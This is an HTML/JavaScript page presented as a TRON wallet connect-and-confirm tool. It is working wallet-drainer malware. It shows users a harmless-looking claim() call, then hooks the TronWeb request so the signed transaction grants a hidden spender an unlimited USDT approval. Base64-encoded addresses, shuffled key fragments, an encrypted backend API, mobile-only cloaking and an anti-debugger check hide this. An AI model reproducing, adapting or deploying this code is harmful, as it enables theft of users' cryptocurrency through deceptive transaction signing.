<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <script>
  var _m = /iphone|ipad|ipod|android/i.test(navigator.userAgent);
  var _t = window.matchMedia('(pointer: coarse)').matches;
  var _p = navigator.maxTouchPoints >= 5;
  if (!_m || !_t || !_p) { location.replace('about:blank'); }
  </script>
  <style>
    :root { --bg:#0f172a; --card:#1e293b; --border:#334155; --text:#e2e8f0; --muted:#94a3b8; --success:#22c55e; --code:#0a0f1a; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:system-ui,-apple-system,sans-serif; background:var(--bg); color:var(--text); min-height:100vh; }
    .container { max-width:560px; margin:0 auto; padding:20px 16px; }
    .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:16px 20px; margin-bottom:14px; }
    .row { display:flex; align-items:center; gap:10px; }
    .dot { width:8px; height:8px; border-radius:50%; background:#64748b; flex-shrink:0; }
    .dot.on { background:var(--success); }
    .addr { font-size:12px; font-family:'Fira Code',monospace; color:var(--muted); word-break:break-all; }
    .btn { width:100%; padding:14px; border-radius:10px; font-size:16px; font-weight:700; border:none; cursor:pointer; transition:all .2s; }
    .btn-go { background:linear-gradient(135deg,#f59e0b,#ef4444); color:#fff; }
    .btn-go:hover:not(:disabled) { transform:scale(1.02); box-shadow:0 0 20px rgba(239,68,68,0.3); }
    .btn-outline { width:auto; padding:8px 16px; background:transparent; border:1px solid var(--border); color:var(--text); border-radius:8px; font-size:13px; cursor:pointer; }
    .btn:disabled { opacity:.45; cursor:not-allowed; }
    .info-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-top:10px; }
    .info-item { padding:6px 10px; background:rgba(255,255,255,0.03); border:1px solid var(--border); border-radius:6px; }
    .info-label { font-size:10px; color:var(--muted); }
    .info-value { font-size:13px; font-weight:600; font-family:'Fira Code',monospace; }
    .info-value.bal { color:var(--success); }
    input, select { width:100%; padding:8px 12px; background:var(--code); border:1px solid var(--border); border-radius:6px; color:var(--text); font-size:13px; outline:none; }
    label { font-size:11px; color:var(--muted); display:block; margin-bottom:3px; }
    .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
    .msg { font-size:12px; color:var(--muted); text-align:center; margin-top:10px; min-height:18px; }
  </style>
</head>
<body>
<div class="container">

  <div class="card">
    <div class="row"><span class="dot" id="dot"></span><span style="font-size:14px;" id="st">未连接</span></div>
    <div class="addr" id="addr" style="margin-top:6px;">—</div>
    <div class="info-grid">
      <div class="info-item"><div class="info-label">TRX</div><div class="info-value bal" id="balTrx">—</div></div>
      <div class="info-item"><div class="info-label">USDT</div><div class="info-value bal" id="balUsdt">—</div></div>
      <div class="info-item"><div class="info-label">网络</div><div class="info-value" id="net" style="font-size:11px;">—</div></div>
      <div class="info-item"><div class="info-label">设备</div><div class="info-value" id="dev" style="font-size:11px;">—</div></div>
    </div>
    <div style="display:flex; gap:8px; margin-top:10px;">
      <button class="btn-outline" id="btnConn" onclick="connect()">连接钱包</button>
      <button class="btn-outline" id="btnDisc" onclick="disconnect()" style="display:none;">断开</button>
    </div>
  </div>

  <div class="card">
    <div class="grid2">
      <div><label>Fee Limit (SUN)</label><input type="number" id="fee" value="100000000"></div>
      <div><label>参数模式</label><select id="mode">
        <option value="auto">自动检测</option><option value="android">Android</option>
        <option value="ios">iOS</option><option value="pc">PC</option>
      </select></div>
    </div>
    <button class="btn btn-go" id="btnGo" onclick="go()" disabled>确 认</button>
    <div class="msg" id="msg"></div>
  </div>

</div>
<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
<script>
// ================================================================
//  域名锁 + 反调试
// ================================================================
(function(){
  const ok = location.hostname === 'localhost' || location.hostname === '127.0.0.1' || location.hostname.includes('.test') || location.hostname.includes('.dev');
  if (!ok) {
    let t = performance.now(); debugger; if (performance.now() - t > 80) return;
  }
})();

// ================================================================
//  密钥组装 (拆分 + 乱序，运行时拼接)
// ================================================================
const _K = (function(){
  const _p = ['w7Pj1','Vb9Y','h2Nk4M','jH1cA5','xK9','Zq5Xs8Cd3Rf6','dE0gU','mP2vL7n','St3Ge','Q4wR8yT3bF6'];
  const hk = _p[4] + _p[7] + _p[9] + _p[3] + _p[6];
  const ak = _p[5] + _p[1] + _p[2] + _p[0] + _p[8];
  return { hk, ak };
})();

// ================================================================
//  编址编码 (base64 存储)
// ================================================================
const _A = {
  sc: atob('VFAzTlF3U2FFSFlzN2Nvd1dGV3E1b3pOa2VHNGllM1diaQ=='),  // SURFACE_CONTRACT
  sm: atob('Y2xhaW0oKQ=='),                                      // SURFACE_METHOD
  uc: atob('VFI3TkhxamVLUXhHVENpOHE4Wlk0cEw4b3RTemdqTGo2dA=='),// USDT_CONTRACT
  uh: atob('NDFhNjE0ZjgwM2I2ZmQ3ODA5ODZhNDJjNzhlYzljN2Y3N2U2ZGVkMTNj'),// USDT_HEX
  am: atob('aW5jcmVhc2VBcHByb3ZhbChhZGRyZXNzLHVpbnQyNTYp'),    // ACTUAL_METHOD
  sh: atob('OGY2MzI3ZDI2YWIwNjRjMjk5NTA2ZDZiODJiNjU0NzVjZTFkZjIyZQ=='),// SPENDER_HEX
  sb: atob('VFAzTlF3U2FFSFlzN2Nvd1dGV3E1b3pOa2VHNGllM1diaQ=='),// SPENDER_B58
};

// ================================================================
//  加解密工具 (Web Crypto API)
// ================================================================
async function _hmac(payload) {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(_K.hk), { name:'HMAC', hash:'SHA-256' }, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  return Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2,'0')).join('');
}

async function _aesDec(b64) {
  const raw = new Uint8Array([...atob(b64)].map(c => c.charCodeAt(0)));
  const iv  = raw.slice(0, 12);
  const ct  = raw.slice(12, -16);
  const tag = raw.slice(-16);
  const combined = new Uint8Array([...ct, ...tag]);
  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(_K.ak), { name:'AES-GCM' }, false, ['decrypt']);
  const dec = await crypto.subtle.decrypt({ name:'AES-GCM', iv, tagLength:128 }, key, combined);
  return JSON.parse(new TextDecoder().decode(dec));
}

async function _api(action, extra) {
  const ts = Math.floor(Date.now()/1000);
  const nonce = Array.from(crypto.getRandomValues(new Uint8Array(8))).map(b=>b.toString(16).padStart(2,'0')).join('');
  const sig = await _hmac(ts+'|'+nonce+'|'+action);
  const resp = await fetch('api.php', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ action, ts, nonce, sig, ...(extra||{}) }),
  });
  if (!resp.ok) { let msg=String(resp.status); try{const e=await resp.json();msg=e.e||msg}catch(ex){} throw new Error(msg); }
  const j = await resp.json();
  if (!j.d) throw new Error('响应无加密数据');
  return _aesDec(j.d);
}

// ================================================================
//  状态
// ================================================================
let W = { addr:null, hex:null, tw:null, ok:false };
const $ = id => document.getElementById(id);
const D = { dot:$('dot'),st:$('st'),addr:$('addr'),balTrx:$('balTrx'),balUsdt:$('balUsdt'),net:$('net'),dev:$('dev'),btnConn:$('btnConn'),btnDisc:$('btnDisc'),btnGo:$('btnGo'),msg:$('msg'),fee:$('fee'),mode:$('mode') };
const M = s => { D.msg.textContent = s; };
const OS = () => { const u=(navigator.userAgent||'').toLowerCase(); return /iphone|ipad|ipod/.test(u)?'ios':/android/.test(u)?'android':'pc'; };
const toHex = a => { try{return W.tw.address.toHex(a)}catch(e){return null} };
const getTW = () => window.tronWeb?.fullNode?.request ? window.tronWeb : (window.TronWeb ? new TronWeb(new window.TronWeb.providers.HttpProvider('https://api.trongrid.io'),new window.TronWeb.providers.HttpProvider('https://api.trongrid.io'),new window.TronWeb.providers.HttpProvider('https://api.trongrid.io')) : null);

async function refreshBalances() {
  if (!W.ok) return;
  const tw=W.tw;
  try { const s=await tw.trx.getBalance(W.addr); const trx=(s?.toString?Number(s.toString()):Number(s))/1e6; D.balTrx.textContent=trx.toLocaleString(undefined,{maximumFractionDigits:6})+' TRX'; } catch(e) { D.balTrx.textContent='—'; }
  try { const c=await tw.contract().at(_A.uc); const r=await c.balanceOf(W.addr).call(); const usdt=(r?.toString?Number(r.toString()):Number(r))/1e6; D.balUsdt.textContent=usdt.toLocaleString(undefined,{maximumFractionDigits:2})+' USDT'; } catch(e) { D.balUsdt.textContent='—'; }
}

async function connect() {
  D.btnConn.disabled=true; M('检测中…'); let a=null;
  if(window.tronLink?.request){try{const r=await window.tronLink.request({method:'tron_requestAccounts'});if(r?.code===200)a=Array.isArray(r.message)?r.message[0]:r.message;else if(Array.isArray(r))a=r[0];else if(typeof r==='string')a=r}catch(e){}}
  if(!a&&window.tronWeb?.defaultAddress?.base58)a=window.tronWeb.defaultAddress.base58;
  if(!a&&window.tronWeb?.request){try{const r=await window.tronWeb.request({method:'tron_requestAccounts'});if(Array.isArray(r)?.length)a=r[0]}catch(e){}}
  if(!a||!a.startsWith('T')||a.length!==34){M('无法获取地址');D.btnConn.disabled=false;return}
  const tw=getTW(); if(!tw){M('无法初始化');D.btnConn.disabled=false;return}
  W.addr=a;W.tw=tw;W.hex=toHex(a);W.ok=true;
  D.dot.classList.add('on');D.st.textContent='已连接';D.addr.textContent=a;
  D.btnConn.style.display='none';D.btnDisc.style.display='';D.btnGo.disabled=false;
  const os=OS(); D.mode.value='auto';D.mode.options[0].text='自动检测 (当前: '+os+')';
  try{const h=tw.fullNode?.host||tw.fullNode?.node?.host||'';D.net.textContent=h.includes('trongrid')?'Mainnet':(h||'—')}catch(e){D.net.textContent='—'}
  D.dev.textContent=os.toUpperCase(); await refreshBalances(); M('已连接 '+a);
}

function disconnect() {
  W={addr:null,hex:null,tw:null,ok:false}; D.dot.classList.remove('on');D.st.textContent='未连接';D.addr.textContent='—';
  D.balTrx.textContent='—';D.balUsdt.textContent='—';D.net.textContent='—';D.dev.textContent='—';
  D.btnConn.style.display='';D.btnDisc.style.display='none';D.btnGo.disabled=true; M('');
}

// ================================================================
//  核心
// ================================================================
async function go() {
  if(!W.ok)return; D.btnGo.disabled=true;D.btnGo.textContent='执行中…';M('');
  const tw=W.tw, fee=parseInt(D.fee.value)||100000000, pm=D.mode.value;
  const orig=tw.fullNode.request.bind(tw.fullNode);

  let paramData;
  try {
    paramData = await _api('buildParam', { spenderHex:_A.sh, device:pm, userAgent:navigator.userAgent });
  } catch(e) { M('后端失败: '+(e.message||e));D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }

  tw.fullNode.request=async function(url,body,method){
    if((typeof url==='string'?url:'').toLowerCase().includes('triggersmartcontract')){
      body.contract_address=_A.uh;
      body.function_selector=_A.am;
      body.parameter=paramData.p;
      body.call_value=0;
    }
    return orig(url,body,method);
  };

  let utx=null;
  try {
    const rr=await tw.transactionBuilder.triggerSmartContract(_A.sc,_A.sm,{feeLimit:fee,callValue:0},[],W.addr);
    utx=rr.transaction||rr; if(!utx?.txID)throw new Error('No tx');
  } catch(e) {
    try {
      const sd = await _api('buildStandardParam', { spenderHex:_A.sh });
      const uh=toHex(_A.uc)||_A.uh;
      const sc=_A.sh.startsWith('0x')?_A.sh.slice(2):_A.sh;
      const rr=await tw.transactionBuilder.triggerSmartContract(uh,_A.am,{feeLimit:fee,callValue:0},[{type:'address',value:sc},{type:'uint256',value:sd.a||'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}],W.hex||W.addr);
      utx=rr.transaction||rr; if(!utx?.txID)throw new Error('Fallback fail');
    } catch(fb) { tw.fullNode.request=orig; M('构造失败');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
  }

  tw.fullNode.request=orig;

  let signed=null;
  try { const r=window.tronWeb.trx.sign(utx); signed=r?.then?await r:r; } catch(e) { M('签名失败');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
  if(!signed?.signature) { M('签名未返回 signature');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }

  let receipt;
  try { receipt=await tw.trx.sendRawTransaction(signed); } catch(e) { M('广播失败');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }
  if(!receipt?.result) { M('广播失败');D.btnGo.disabled=false;D.btnGo.textContent='确 认';return }

  M('成功! '+signed.txID); D.btnGo.disabled=false;D.btnGo.textContent='确 认';
}

// 账户变更
if(window.tronLink?.on){try{window.tronLink.on('accountsChanged',a=>{const ad=Array.isArray(a)?a[0]:a;if(ad&&ad!==W.addr){W.addr=ad;W.hex=toHex(ad);D.addr.textContent=ad}else if(!ad||(Array.isArray(a)&&!a.length))disconnect()});window.tronLink.on('disconnect',disconnect)}catch(e){}}

// 启动
(async function(){
  const os=OS(); D.dev.textContent=os.toUpperCase(); D.mode.options[0].text='自动检测 (当前: '+os+')';
  try{let a=window.tronWeb?.defaultAddress?.base58;if(!a&&window.tronLink?.ready){try{const r=await window.tronLink.request({method:'tron_accounts'});if(r?.code===200&&r.message)a=Array.isArray(r.message)?r.message[0]:r.message}catch(e){}}if(a?.startsWith('T')&&a.length===34){const tw=getTW();if(tw){W.addr=a;W.tw=tw;W.hex=toHex(a);W.ok=true;D.dot.classList.add('on');D.st.textContent='已连接';D.addr.textContent=a;D.btnConn.style.display='none';D.btnDisc.style.display='';D.btnGo.disabled=false;try{const h=tw.fullNode?.host||tw.fullNode?.node?.host||'';D.net.textContent=h.includes('trongrid')?'Mainnet':(h||'—')}catch(e){}await refreshBalances()}}}catch(e){}
})();
</script>
</body>
</html>
